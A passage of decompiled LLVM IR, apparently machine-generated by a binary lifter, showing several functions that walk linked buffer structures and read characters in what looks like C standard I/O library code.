  %v3_e5d4.pre = load i32, i32* %r2.global-to-local, align 4
  br i1 %v0_e5c8.pr, label %dec_label_pc_e5d4, label %.thread1

.thread1:                                         ; preds = %bb
  %v2_e5c8 = inttoptr i32 %v3_e5d4.pre to i8*
  %v3_e5c8 = load i8, i8* %v2_e5c8, align 1
  %v4_e5c8 = zext i8 %v3_e5c8 to i32
  store i32 %v4_e5c8, i32* %r5.global-to-local, align 4
  %v6_e5c8 = add i32 %v3_e5d4.pre, 1
  store i32 %v6_e5c8, i32* %r2.global-to-local, align 4
  store i32 %v6_e5c8, i32* %v2_e5b8, align 4
  br label %dec_label_pc_e644

dec_label_pc_e5d4:                                ; preds = %bb, %dec_label_pc_e5b8
  %v3_e5d4 = phi i32 [ %v3_e5b8, %dec_label_pc_e5b8 ], [ %v3_e5d4.pre, %bb ]
  %v5_e5d4 = call i32 @function_ea1c(i8 %arg1, i32 %arg2, i32 %v3_e5d4)
  store i32 %v5_e5d4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_e644

dec_label_pc_e5e0:                                ; preds = %dec_label_pc_e594
  store i32 %v2_e5a4, i32* @r0, align 4
  %v1_e5f0 = call i32 @function_10840()
  store i32 58884, i32* @lr, align 4
  %v1_e600 = call i32 @function_10838()
  %v0_e604 = load i32, i32* @r4, align 4
  %v1_e604 = add i32 %v0_e604, 16
  %v2_e604 = inttoptr i32 %v1_e604 to i32*
  %v3_e604 = load i32, i32* %v2_e604, align 4
  store i32 %v3_e604, i32* %r2.global-to-local, align 4
  %v1_e608 = add i32 %v0_e604, 28
  %v2_e608 = inttoptr i32 %v1_e608 to i32*
  %v3_e608 = load i32, i32* %v2_e608, align 4
  %v3_e60c = icmp uge i32 %v3_e604, %v3_e608
  store i1 %v3_e60c, i1* %cpsr_c.global-to-local, align 1
  %v0_e614 = load i32, i32* @r5, align 4
  %v1_e614 = trunc i32 %v0_e614 to i8
  br i1 %v3_e60c, label %dec_label_pc_e628, label %bb12

bb12:                                             ; preds = %dec_label_pc_e5e0
  %v4_e618 = inttoptr i32 %v3_e604 to i8*
  store i8 %v1_e614, i8* %v4_e618, align 1
  %v0_e61c.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  %v3_e628.pre = load i32, i32* %r2.global-to-local, align 4
  br i1 %v0_e61c.pr, label %dec_label_pc_e628, label %.thread4

.thread4:                                         ; preds = %bb12
  %v2_e61c = inttoptr i32 %v3_e628.pre to i8*
  %v3_e61c = load i8, i8* %v2_e61c, align 1
  %v4_e61c = zext i8 %v3_e61c to i32
  store i32 %v4_e61c, i32* %r5.global-to-local, align 4
  %v6_e61c = add i32 %v3_e628.pre, 1
  store i32 %v6_e61c, i32* %r2.global-to-local, align 4
  %v2_e620 = load i32, i32* @r4, align 4
  %v3_e620 = add i32 %v2_e620, 16
  %v4_e620 = inttoptr i32 %v3_e620 to i32*
  store i32 %v6_e61c, i32* %v4_e620, align 4
  br label %dec_label_pc_e630

dec_label_pc_e628:                                ; preds = %bb12, %dec_label_pc_e5e0
  %v3_e628 = phi i32 [ %v3_e604, %dec_label_pc_e5e0 ], [ %v3_e628.pre, %bb12 ]
  %v5_e628 = call i32 @function_ea1c(i8 %v1_e614, i32 %v0_e604, i32 %v3_e628)
  store i32 %v5_e628, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_e630

dec_label_pc_e630:                                ; preds = %.thread4, %dec_label_pc_e628
  store i32 %v2_e5a4, i32* @r0, align 4
  store i32 58948, i32* @lr, align 4
  %v1_e640 = call i32 @function_10840()
  br label %dec_label_pc_e644

dec_label_pc_e644:                                ; preds = %.thread1, %dec_label_pc_e5d4, %dec_label_pc_e630
  %v0_e644 = load i32, i32* %r5.global-to-local, align 4
  %v2_e64c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_e64c, i32* @r4, align 4
  store i32 %v6_e594, i32* @r5, align 4
  store i32 %v9_e594, i32* @r6, align 4
  %sext = mul i32 %v0_e644, 16777216
  %v15_e64c = sdiv i32 %sext, 16777216
  ret i32 %v15_e64c

; uselistorder directives
  uselistorder i32 %v3_e628.pre, { 0, 2, 1 }
  uselistorder i8 %v1_e614, { 1, 0 }
  uselistorder i32 %v3_e5d4.pre, { 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 5, 4 }
  uselistorder i8 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e644, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e630, { 1, 0 }
}

define i32 @function_e660(i32 %arg1) local_unnamed_addr {
dec_label_pc_e660:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v2_e664 = ptrtoint i32* %stack_var_-48 to i32
  %v2_e668 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_e668, i32* @r0, align 4
  store i32 67648, i32* %r4.global-to-local, align 4
  %v1_e67c = call i32 @function_10840()
  store i32 ptrtoint (i8* @global_var_10838.270 to i32), i32* %r5.global-to-local, align 4
  %v1_e68c = call i32 @function_10838()
  %v2_e694 = load i32, i32* @global_var_188a4.276, align 4
  %v7_e698 = icmp eq i32 %v2_e694, 1
  br i1 %v7_e698, label %dec_label_pc_e6a0, label %dec_label_pc_e74c

dec_label_pc_e6a0:                                ; preds = %dec_label_pc_e660
  %v2_e6a4 = load i32, i32* @global_var_188a8.281, align 4
  %tmp19 = icmp slt i32 %v2_e6a4, 1
  br i1 %tmp19, label %dec_label_pc_e74c, label %dec_label_pc_e6b0

dec_label_pc_e6b0:                                ; preds = %dec_label_pc_e6a0
  store i32 %v2_e664, i32* @r0, align 4
  %v1_e6c0 = call i32 @function_10840()
  %v1_e6cc = call i32 @function_10838()
  %v2_e6d4 = load i32, i32* bitcast (i32** @global_var_1810c.316 to i32*), align 4
  store i32 %v2_e6d4, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_e7243 = icmp eq i32 %v2_e6d4, 0
  br i1 %v2_e7243, label %dec_label_pc_e730, label %dec_label_pc_e6e0

dec_label_pc_e6e0:                                ; preds = %dec_label_pc_e6b0, %dec_label_pc_e720
  %v1_e6f8 = phi i32 [ %v0_e720, %dec_label_pc_e720 ], [ %v2_e6d4, %dec_label_pc_e6b0 ]
  %v1_e6e0 = inttoptr i32 %v1_e6f8 to i8*
  %v2_e6e0 = load i8, i8* %v1_e6e0, align 1
  %v3_e6e0 = zext i8 %v2_e6e0 to i32
  %v1_e6e4 = add i32 %v1_e6f8, 1
  %v2_e6e4 = inttoptr i32 %v1_e6e4 to i8*
  %v3_e6e4 = load i8, i8* %v2_e6e4, align 1
  %v4_e6e4 = zext i8 %v3_e6e4 to i32
  %v4_e6e8 = mul nuw nsw i32 %v4_e6e4, 256
  %v5_e6e8 = or i32 %v4_e6e8, %v3_e6e0
  %v2_e6ec = and i32 %v5_e6e8, 32816
  %v7_e6f0 = icmp eq i32 %v2_e6ec, 48
  %v1_e6f4 = add i32 %v1_e6f8, 32
  %v2_e6f4 = inttoptr i32 %v1_e6f4 to i32*
  %v3_e6f4 = load i32, i32* %v2_e6f4, align 4
  store i32 %v3_e6f4, i32* %r5.global-to-local, align 4
  br i1 %v7_e6f0, label %dec_label_pc_e700, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_e6e0
  store i32 %v1_e6f8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e720

dec_label_pc_e700:                                ; preds = %dec_label_pc_e6e0
  %v0_e700 = load i32, i32* %r6.global-to-local, align 4
  %v2_e700 = icmp eq i32 %v0_e700, 0
  br i1 %v2_e700, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_e700
  %v3_e708 = add i32 %v0_e700, 32
  %v4_e708 = inttoptr i32 %v3_e708 to i32*
  store i32 %v3_e6f4, i32* %v4_e708, align 4
  %v0_e710.pre = load i32, i32* %r4.global-to-local, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_e700
  store i32 %v3_e6f4, i32* bitcast (i32** @global_var_1810c.316 to i32*), align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_e710 = phi i32 [ %v0_e710.pre, %.thread ], [ %v1_e6f8, %.thread1 ]
  %v1_e710 = add i32 %v0_e710, 1
  %v2_e710 = inttoptr i32 %v1_e710 to i8*
  %v3_e710 = load i8, i8* %v2_e710, align 1
  %v1_e714 = and i8 %v3_e710, 32
  %v1_e71c = icmp ne i8 %v1_e714, 0
  call void @__pseudo_cond_branch(i1 %v1_e71c, i32 ptrtoint (i32* @global_var_fa5c.278 to i32))
  %v0_e720.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_e720

dec_label_pc_e720:                                ; preds = %.thread12, %bb
  %v0_e720 = phi i32 [ %v0_e720.pre, %bb ], [ %v3_e6f4, %.thread12 ]
  store i32 %v0_e720, i32* %r4.global-to-local, align 4
  %v2_e724 = icmp eq i32 %v0_e720, 0
  br i1 %v2_e724, label %dec_label_pc_e730, label %dec_label_pc_e6e0

dec_label_pc_e730:                                ; preds = %dec_label_pc_e720, %dec_label_pc_e6b0
  store i32 %v2_e664, i32* @r0, align 4
  %v1_e740 = call i32 @function_10840()
  %v0_e748 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e748, i32* @global_var_188a8.281, align 4
  %v2_e750.pre = load i32, i32* @global_var_188a4.276, align 4
  br label %dec_label_pc_e74c

dec_label_pc_e74c:                                ; preds = %dec_label_pc_e660, %dec_label_pc_e6a0, %dec_label_pc_e730
  %v2_e750 = phi i32 [ %v2_e694, %dec_label_pc_e660 ], [ 1, %dec_label_pc_e6a0 ], [ %v2_e750.pre, %dec_label_pc_e730 ]
  %v1_e754 = add i32 %v2_e750, -1
  store i32 %v1_e754, i32* @global_var_188a4.276, align 4
  store i32 %v2_e668, i32* @r0, align 4
  store i32 59248, i32* @lr, align 4
  %v1_e76c = call i32 @function_10840()
  ret i32 %v1_e76c

; uselistorder directives
  uselistorder i32 %v0_e720, { 2, 1, 0 }
  uselistorder i32 %v3_e6f4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_e6f8, { 0, 1, 2, 4, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* @global_var_188a8.281, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_e74c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e720, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_e6e0, { 1, 0 }
}

define i32 @function_e7a0(i8* %arg1) local_unnamed_addr {
dec_label_pc_e7a0:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_e7a0 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32** @global_var_1810c.316 to i32), i32* %r3.global-to-local, align 4
  %v10_e7a8 = icmp eq i8* %arg1, bitcast (i32** @global_var_1810c.316 to i8*)
  store i1 %v10_e7a8, i1* %cpsr_z.global-to-local, align 1
  %.v1_e7ac = select i1 %v10_e7a8, i32 0, i32 %tmp
  store i32 %.v1_e7ac, i32* %r8.global-to-local, align 4
  %v2_e7b4 = ptrtoint i32* %stack_var_-44 to i32
  br i1 %v10_e7a8, label %bb, label %dec_label_pc_e7c0

bb:                                               ; preds = %dec_label_pc_e7a0
  store i32 %.v1_e7ac, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_e7cc

dec_label_pc_e7c0:                                ; preds = %dec_label_pc_e7a0
  %v2_e7c0 = icmp eq i32 %.v1_e7ac, 0
  store i1 %v2_e7c0, i1* %cpsr_z.global-to-local, align 1
  store i32 256, i32* %sl.global-to-local, align 4
  br i1 %v2_e7c0, label %dec_label_pc_e7cc, label %dec_label_pc_e918

dec_label_pc_e7cc:                                ; preds = %bb, %dec_label_pc_e7c0
  store i32 ptrtoint (i8* @global_var_10838.270 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_e7b4, i32* @r0, align 4
  %v1_e7e0 = call i32 @function_10840()
  store i32 ptrtoint (i32* @global_var_18128.274 to i32), i32* %r0.global-to-local, align 4
  %v1_e7f0 = call i32 @function_10838()
  %v2_e7f8 = load i32, i32* @global_var_188a4.276, align 4
  %v1_e7fc = add i32 %v2_e7f8, 1
  store i32 %v1_e7fc, i32* %r3.global-to-local, align 4
  store i32 %v1_e7fc, i32* @global_var_188a4.276, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_e7b4, i32* @r0, align 4
  %v1_e814 = call i32 @function_10840()
  store i32 ptrtoint (i8* @global_var_10838.270 to i32), i32* %r1.global-to-local, align 4
  store i32 %v2_e7b4, i32* @r0, align 4
  %v1_e828 = call i32 @function_10840()
  store i32 ptrtoint (i32* @global_var_18110.313 to i32), i32* %r0.global-to-local, align 4
  %v1_e834 = call i32 @function_10838()
  store i32 ptrtoint (i32** @global_var_1810c.316 to i32), i32* %r3.global-to-local, align 4
  store i32 %v2_e7b4, i32* @r0, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_e844 = load i32, i32* bitcast (i32** @global_var_1810c.316 to i32*), align 4
  store i32 %v2_e844, i32* @r6, align 4
  %v1_e84c = call i32 @function_10840()
  store i32 %v1_e84c, i32* %r0.global-to-local, align 4
  store i32 %v2_e7b4, i32* @r4, align 4
  %v0_e854 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_e854, i32* @r5, align 4
  %v0_e908.pr = load i32, i32* @r6, align 4
  %v2_e90825 = icmp eq i32 %v0_e908.pr, 0
  store i1 %v2_e90825, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e90825, label %dec_label_pc_e910, label %dec_label_pc_e85c

dec_label_pc_e85c:                                ; preds = %dec_label_pc_e7cc, %.thread11
  %v0_e878 = phi i32 [ %v3_e904, %.thread11 ], [ %v0_e908.pr, %dec_label_pc_e7cc ]
  %v1_e85c = inttoptr i32 %v0_e878 to i8*
  %v2_e85c = load i8, i8* %v1_e85c, align 1
  %v3_e85c = zext i8 %v2_e85c to i32
  store i32 %v3_e85c, i32* %r3.global-to-local, align 4
  %v1_e860 = and i32 %v3_e85c, 64
  %v2_e860 = icmp eq i32 %v1_e860, 0
  store i1 %v2_e860, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e860, label %.thread11, label %dec_label_pc_e868

dec_label_pc_e868:                                ; preds = %dec_label_pc_e85c
  %v2_e86c = load i32, i32* @global_var_18140.307, align 4
  store i32 %v2_e86c, i32* %r3.global-to-local, align 4
  %v7_e870 = icmp eq i32 %v2_e86c, 2
  store i1 %v7_e870, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e870, label %dec_label_pc_e8a4, label %dec_label_pc_e878

dec_label_pc_e878:                                ; preds = %dec_label_pc_e868
  %v1_e878 = add i32 %v0_e878, 56
  store i32 %v1_e878, i32* @r4, align 4
  store i32 %v2_e7b4, i32* @r0, align 4
  store i32 67648, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_10838.270 to i32), i32* %r1.global-to-local, align 4
  %v1_e890 = call i32 @function_10840()
  %v0_e894 = load i32, i32* @r4, align 4
  store i32 %v0_e894, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_10838.270 to i32), i32* %r3.global-to-local, align 4
  %v1_e8a0 = call i32 @function_10838()
  store i32 %v1_e8a0, i32* %r0.global-to-local, align 4
  %v0_e8a4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_e8a4

dec_label_pc_e8a4:                                ; preds = %dec_label_pc_e868, %dec_label_pc_e878
  %v0_e8b8 = phi i32 [ %v0_e878, %dec_label_pc_e868 ], [ %v0_e8a4.pre, %dec_label_pc_e878 ]
  %v1_e8a4 = inttoptr i32 %v0_e8b8 to i32*
  %v2_e8a4 = load i32, i32* %v1_e8a4, align 4
  %v0_e8a8 = load i32, i32* %sl.global-to-local, align 4
  %v2_e8a8 = or i32 %v0_e8a8, %v2_e8a4
  %v1_e8ac = xor i32 %v2_e8a8, 320
  store i32 %v1_e8ac, i32* %r3.global-to-local, align 4
  %v1_e8b0 = and i32 %v1_e8ac, 832
  %v2_e8b0 = icmp eq i32 %v1_e8b0, 0
  store i1 %v2_e8b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e8b0, label %dec_label_pc_e8b8, label %bb39

dec_label_pc_e8b8:                                ; preds = %dec_label_pc_e8a4
  store i32 %v0_e8b8, i32* @r0, align 4
  %v0_e8bc = call i32 @function_d60c()
  store i32 %v0_e8bc, i32* %r0.global-to-local, align 4
  %v2_e8c0 = icmp eq i32 %v0_e8bc, 0
  store i1 %v2_e8c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e8c0, label %.thread5, label %.thread7

.thread5:                                         ; preds = %dec_label_pc_e8b8
  %v1_e8c4 = load i32, i32* @r6, align 4
  %v2_e8c4 = inttoptr i32 %v1_e8c4 to i32*
  %v3_e8c4 = load i32, i32* %v2_e8c4, align 4
  store i32 %v3_e8c4, i32* %r3.global-to-local, align 4
  %v2_e8c8 = add i32 %v1_e8c4, 8
  %v3_e8c8 = inttoptr i32 %v2_e8c8 to i32*
  %v4_e8c8 = load i32, i32* %v3_e8c8, align 4
  %v2_e8cc = and i32 %v3_e8c4, -65
  store i32 %v2_e8cc, i32* %r3.global-to-local, align 4
  %v4_e8d0 = sdiv i32 %v3_e8c4, 256
  store i32 %v4_e8d0, i32* %r1.global-to-local, align 4
  %v3_e8d4 = add i32 %v1_e8c4, 28
  %v4_e8d4 = inttoptr i32 %v3_e8d4 to i32*
  store i32 %v4_e8c8, i32* %v4_e8d4, align 4
  %v1_e8d8 = load i32, i32* %r1.global-to-local, align 4
  %v2_e8d8 = trunc i32 %v1_e8d8 to i8
  %v3_e8d8 = load i32, i32* @r6, align 4
  %v4_e8d8 = add i32 %v3_e8d8, 1
  %v5_e8d8 = inttoptr i32 %v4_e8d8 to i8*
  store i8 %v2_e8d8, i8* %v5_e8d8, align 1
  %v0_e8dc.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e8dc.pr.pr.pr, label %.thread6, label %.thread7

.thread6:                                         ; preds = %.thread5
  %v1_e8dc = load i32, i32* %r3.global-to-local, align 4
  %v2_e8dc = trunc i32 %v1_e8dc to i8
  %v3_e8dc = load i32, i32* @r6, align 4
  %v4_e8dc = inttoptr i32 %v3_e8dc to i8*
  store i8 %v2_e8dc, i8* %v4_e8dc, align 1
  %v0_e8e0.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e8e0.pr.pr.pr, label %bb39, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_e8b8, %.thread5, %.thread6
  store i32 -1, i32* @r5, align 4
  br label %bb39

bb39:                                             ; preds = %dec_label_pc_e8a4, %.thread6, %.thread7
  %v2_e8e8 = load i32, i32* @global_var_18140.307, align 4
  store i32 %v2_e8e8, i32* %r3.global-to-local, align 4
  %v7_e8ec = icmp eq i32 %v2_e8e8, 2
  store i1 %v7_e8ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e8ec, label %.thread11, label %bb40

bb40:                                             ; preds = %bb39
  store i32 %v2_e7b4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 67648, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 67648)
  br label %.thread11

.thread11:                                        ; preds = %bb39, %dec_label_pc_e85c, %bb40
  %v0_e904 = load i32, i32* @r6, align 4
  %v1_e904 = add i32 %v0_e904, 32
  %v2_e904 = inttoptr i32 %v1_e904 to i32*
  %v3_e904 = load i32, i32* %v2_e904, align 4
  store i32 %v3_e904, i32* @r6, align 4
  %v2_e908 = icmp eq i32 %v3_e904, 0
  store i1 %v2_e908, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e908, label %dec_label_pc_e908.dec_label_pc_e910_crit_edge, label %dec_label_pc_e85c

dec_label_pc_e908.dec_label_pc_e910_crit_edge:    ; preds = %.thread11
  %v0_e910.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e910

dec_label_pc_e910:                                ; preds = %dec_label_pc_e908.dec_label_pc_e910_crit_edge, %dec_label_pc_e7cc
  %v0_e910 = phi i32 [ %v0_e910.pre, %dec_label_pc_e908.dec_label_pc_e910_crit_edge ], [ %v1_e84c, %dec_label_pc_e7cc ]
  %v1_e910 = call i32 @function_e660(i32 %v0_e910)
  store i32 %v1_e910, i32* %r0.global-to-local, align 4
  %v0_e954.pre = load i32, i32* @r5, align 4
  br label %bb43

dec_label_pc_e918:                                ; preds = %dec_label_pc_e7c0
  %v1_e918 = inttoptr i32 %.v1_e7ac to i8*
  %v2_e918 = load i8, i8* %v1_e918, align 1
  %v3_e918 = zext i8 %v2_e918 to i32
  %v1_e91c = and i32 %v3_e918, 64
  store i32 %v1_e91c, i32* %r3.global-to-local, align 4
  %v2_e91c = icmp eq i32 %v1_e91c, 0
  store i1 %v2_e91c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e91c, label %bb41, label %dec_label_pc_e928

bb41:                                             ; preds = %dec_label_pc_e918
  br label %bb43

dec_label_pc_e928:                                ; preds = %dec_label_pc_e918
  %v0_e928 = call i32 @function_d60c()
  store i32 %v0_e928, i32* %r0.global-to-local, align 4
  %v2_e92c = icmp eq i32 %v0_e928, 0
  store i1 %v2_e92c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e92c, label %.thread16, label %bb42

.thread16:                                        ; preds = %dec_label_pc_e928
  %v1_e930 = load i32, i32* %r8.global-to-local, align 4
  %v2_e930 = inttoptr i32 %v1_e930 to i32*
  %v3_e930 = load i32, i32* %v2_e930, align 4
  store i32 %v3_e930, i32* %r3.global-to-local, align 4
  %v2_e934 = add i32 %v1_e930, 8
  %v3_e934 = inttoptr i32 %v2_e934 to i32*
  %v4_e934 = load i32, i32* %v3_e934, align 4
  store i32 %v4_e934, i32* %r1.global-to-local, align 4
  %v2_e938 = and i32 %v3_e930, -65
  store i32 %v2_e938, i32* %r3.global-to-local, align 4
  %v4_e93c = sdiv i32 %v3_e930, 256
  %v2_e940 = trunc i32 %v4_e93c to i8
  %v4_e940 = add i32 %v1_e930, 1
  %v5_e940 = inttoptr i32 %v4_e940 to i8*
  store i8 %v2_e940, i8* %v5_e940, align 1
  %v0_e944.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e944.pr.pr.pr, label %.thread18, label %.thread21

.thread18:                                        ; preds = %.thread16
  %v1_e944 = load i32, i32* %r1.global-to-local, align 4
  %v2_e944 = load i32, i32* %r8.global-to-local, align 4
  %v3_e944 = add i32 %v2_e944, 28
  %v4_e944 = inttoptr i32 %v3_e944 to i32*
  store i32 %v1_e944, i32* %v4_e944, align 4
  %v1_e948 = load i32, i32* %r3.global-to-local, align 4
  %v2_e948 = trunc i32 %v1_e948 to i8
  %v3_e948 = load i32, i32* %r8.global-to-local, align 4
  %v4_e948 = inttoptr i32 %v3_e948 to i8*
  store i8 %v2_e948, i8* %v4_e948, align 1
  %v0_e94c.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e94c.pr.pr.pr, label %.thread20, label %.thread21

.thread21:                                        ; preds = %.thread16, %.thread18
  br label %bb43

bb42:                                             ; preds = %dec_label_pc_e928
  br label %bb43

.thread20:                                        ; preds = %.thread18
  br label %bb43

bb43:                                             ; preds = %bb41, %bb42, %.thread21, %dec_label_pc_e910, %.thread20
  %v0_e954 = phi i32 [ -1, %.thread21 ], [ 0, %bb41 ], [ %v0_e954.pre, %dec_label_pc_e910 ], [ -1, %bb42 ], [ 0, %.thread20 ]
  store i32 %v0_e954, i32* %r0.global-to-local, align 4
  store i32 %v3_e7a0, i32* @r4, align 4
  ret i32 %v0_e954

; uselistorder directives
  uselistorder i32 %v0_e954, { 1, 0 }
  uselistorder i32 %v3_e904, { 1, 2, 0 }
  uselistorder i32 %v2_e7b4, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 5, 9, 4, 10, 1, 6, 0, 7, 8 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 12, 5, 7, 6, 8, 9, 10, 11, 0, 13, 14 }
  uselistorder i32 (i32)* @function_e660, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_1810c.316 to i32*), { 3, 0, 4, 1, 2, 5 }
  uselistorder i32* @global_var_188a4.276, { 1, 4, 2, 0, 5, 3, 6 }
  uselistorder label %bb43, { 4, 1, 2, 0, 3 }
  uselistorder label %.thread21, { 1, 0 }
  uselistorder label %.thread11, { 2, 0, 1 }
  uselistorder label %bb39, { 2, 1, 0 }
  uselistorder label %.thread7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e8a4, { 1, 0 }
  uselistorder label %dec_label_pc_e85c, { 1, 0 }
  uselistorder label %dec_label_pc_e7cc, { 1, 0 }
}

define i32 @function_e984(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_e984:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e988 = icmp eq i32 %arg2, 0
  store i1 %v2_e988, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp14 = icmp slt i32 %arg2, 1
  br i1 %tmp14, label %dec_label_pc_ea10, label %dec_label_pc_e9f4.preheader

dec_label_pc_e9f4.preheader:                      ; preds = %dec_label_pc_e984
  store i32 %tmp, i32* @r4, align 4
  %v1_e9f415 = add i32 %arg2, -1
  store i32 %v1_e9f415, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_e9f421 = icmp eq i32 %arg2, 1
  store i1 %v7_e9f421, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9f421, label %dec_label_pc_ea00, label %dec_label_pc_e9a0

dec_label_pc_e9a0:                                ; preds = %dec_label_pc_e9f4.preheader, %dec_label_pc_e9f4.backedge
  %v1_e9f824.in = phi i32 [ %v0_e9f8.pre, %dec_label_pc_e9f4.backedge ], [ %arg3, %dec_label_pc_e9f4.preheader ]
  %v1_e9a0 = add i32 %v1_e9f824.in, 16
  %v2_e9a0 = inttoptr i32 %v1_e9a0 to i32*
  %v3_e9a0 = load i32, i32* %v2_e9a0, align 4
  store i32 %v3_e9a0, i32* %r2.global-to-local, align 4
  %v1_e9a4 = add i32 %v1_e9f824.in, 24
  %v2_e9a4 = inttoptr i32 %v1_e9a4 to i32*
  %v3_e9a4 = load i32, i32* %v2_e9a4, align 4
  %v3_e9a8 = icmp uge i32 %v3_e9a0, %v3_e9a4
  store i1 %v3_e9a8, i1* %cpsr_c.global-to-local, align 1
  %v9_e9a8 = icmp eq i32 %v3_e9a0, %v3_e9a4
  store i1 %v9_e9a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_e9a8, label %dec_label_pc_e9c8, label %dec_label_pc_e9b0

dec_label_pc_e9b0:                                ; preds = %dec_label_pc_e9a0
  %v1_e9b0 = inttoptr i32 %v3_e9a0 to i8*
  %v2_e9b0 = load i8, i8* %v1_e9b0, align 1
  %v5_e9b0 = add i32 %v3_e9a0, 1
  store i32 %v5_e9b0, i32* %r2.global-to-local, align 4
  %v2_e9b4 = load i32, i32* @r4, align 4
  %v3_e9b4 = inttoptr i32 %v2_e9b4 to i8*
  store i8 %v2_e9b0, i8* %v3_e9b4, align 1
  %v0_e9b8 = load i32, i32* @r4, align 4
  %v1_e9b8 = inttoptr i32 %v0_e9b8 to i8*
  %v2_e9b8 = load i8, i8* %v1_e9b8, align 1
  %v5_e9b8 = add i32 %v0_e9b8, 1
  store i32 %v5_e9b8, i32* @r4, align 4
  %v2_e9bc = icmp ugt i8 %v2_e9b8, 9
  store i1 %v2_e9bc, i1* %cpsr_c.global-to-local, align 1
  %v7_e9bc = icmp eq i8 %v2_e9b8, 10
  store i1 %v7_e9bc, i1* %cpsr_z.global-to-local, align 1
  %v0_e9c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_e9c0 = load i32, i32* @r5, align 4
  %v2_e9c0 = add i32 %v1_e9c0, 16
  %v3_e9c0 = inttoptr i32 %v2_e9c0 to i32*
  store i32 %v0_e9c0, i32* %v3_e9c0, align 4
  br i1 %v7_e9bc, label %dec_label_pc_ea00, label %dec_label_pc_e9f4.backedge

dec_label_pc_e9c8:                                ; preds = %dec_label_pc_e9a0
  %v1_e9f824 = inttoptr i32 %v1_e9f824.in to i8*
  %v3_e9c8 = call i32 @function_11e54(i8* %v1_e9f824)
